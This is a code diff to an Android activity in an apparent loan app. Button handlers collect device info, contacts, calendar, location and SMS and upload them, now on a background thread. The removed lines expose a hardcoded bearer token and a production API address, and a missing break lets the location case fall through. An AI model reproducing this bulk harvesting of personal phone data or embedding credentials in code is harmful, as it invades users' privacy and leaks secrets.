@@ -11,6 +11,8 @@ import androidx.appcompat.app.AppCompatActivity;
 import android.os.Bundle;
 import androidx.core.content.FileProvider;
 import com.alibaba.fastjson.JSONException;
+import com.alibaba.fastjson.JSONObject;
+import com.cashhub.cash.common.KndcStorage;
 import com.cashhub.cash.common.UploadData;
 import java.io.File;
 import java.io.IOException;
@@ -64,43 +66,39 @@ public class UploadActivity extends AppCompatActivity {
   }
 
   @RequiresApi(api = Build.VERSION_CODES.M)
-  private void buttonClick(String type) {
+  private void buttonClick(final String type) {
+    new Thread(() -> {
+      try {
+        UploadData mUploadData = new UploadData(this);
 
-    UploadData mUploadData = new UploadData(this);
+        // 获取上传sign_url
+        JSONObject locationJson = new JSONObject();
+        locationJson.put("test", "ooo");
+        long timeStamp = 1635955200;
+        switch (type) {
+          case "device":
+            mUploadData.getAndSendDevice();
+            break;
+          case "contact":
+            mUploadData.getAndSendContact();
+            break;
+          case "calendar":
+            mUploadData.getAndSendCalendar();
+            break;
+          case "location":
+            mUploadData.getAndSendLocation(locationJson);
+          case "location2":
+            mUploadData.getAndSendLocation2();
+            break;
+          default:
+            mUploadData.getAndSendSms(timeStamp);
+            break;
+        }
 
-    // 获取上传sign_url
-    com.alibaba.fastjson.JSONObject systemInfo = new com.alibaba.fastjson.JSONObject();
-    try {
-      systemInfo.put("test", "ooo");
-    } catch (JSONException e) {
-      System.out.println("oss sign:" + e.getMessage());
-      return;
-    }
-    systemInfo = null;
-    String token = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NTQyNzI2NzEsImlkZW50aXR5IjoiMzE4NzIzMTQwNTI2MDE0NDY0Iiwib3JpZ19pYXQiOjE2NTE2ODA2NzF9.yppIbEctNDFhotPwriDprJHqOlV5HrF4ExouR36qKTQ";
-//        String domain = "http://apishop.c99349d1eb3d045a4857270fb79311aa0.cn-shanghai.alicontainer.com/api";  //测试环境
-    String domain = "https://api.cashhubloan.com/api";  //正式环境
-    String deviceKey = "test111c2bd436602c9";
-    long timeStamp = 1635955200;
-    switch (type) {
-      case "device":
-        mUploadData.getAndSendDevice(systemInfo, token, domain, timeStamp, deviceKey);
-        break;
-      case "contact":
-        mUploadData.getAndSendContact(systemInfo, token, domain, timeStamp, deviceKey);
-        break;
-      case "calendar":
-        mUploadData.getAndSendCalendar(systemInfo, token, domain, timeStamp, deviceKey);
-        break;
-      case "location":
-        mUploadData.getAndSendLocation(systemInfo, token, domain, timeStamp, deviceKey);
-      case "location2":
-        mUploadData.getAndSendLocation2(systemInfo, token, domain, timeStamp, deviceKey);
-        break;
-      default:
-        mUploadData.getAndSendSms(systemInfo, token, domain, timeStamp, deviceKey);
-        break;
-    }
+      } catch (Exception e) {
+        Log.d(TAG, e.getMessage());
+      }
+    }).start();//启动线程
   }
 
   @RequiresApi(api = Build.VERSION_CODES.M)
